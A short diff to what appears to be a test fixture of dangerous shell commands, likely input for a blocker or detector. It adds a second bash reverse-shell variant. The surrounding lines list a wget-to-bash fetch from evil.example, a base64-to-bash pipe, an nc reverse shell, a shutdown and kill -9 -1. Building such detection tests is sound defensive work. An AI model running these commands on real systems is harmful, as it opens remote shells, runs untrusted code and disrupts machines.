@@ -12,6 +12,7 @@
     {"id": "wget-pipe-bash", "command": "wget https://evil.example/x.sh -O- | bash"},
     {"id": "base64-decode-exec", "command": "echo aGVsbG8gd29ybGQgdGhpcyBpcyBhIHRlc3QgcGF5bG9hZA== | base64 -d | bash"},
     {"id": "reverse-shell-bash", "command": "bash -i > /dev/tcp/10.0.0.1/4444 0>&1"},
+    {"id": "reverse-shell-bash-amp", "command": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"},
     {"id": "reverse-shell-nc", "command": "nc -e /bin/bash 10.0.0.1 4444"},
     {"id": "shutdown-reboot", "command": "shutdown -h now"},
     {"id": "kill-all-processes", "command": "kill -9 -1"},
